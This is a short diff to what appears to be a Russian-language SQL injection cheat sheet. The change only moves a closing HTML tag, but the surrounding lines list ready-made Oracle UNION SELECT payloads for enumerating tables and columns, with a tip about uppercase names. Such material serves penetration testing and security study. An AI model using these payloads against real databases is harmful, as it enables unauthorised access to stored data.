@@ -137,4 +137,5 @@ SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 ### Готовые payload'ы для Oracle:
 - ' UNION SELECT table_name, NULL FROM all_tables--<br>
 - ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--<br>
-### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!<details>
+### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
+</details>
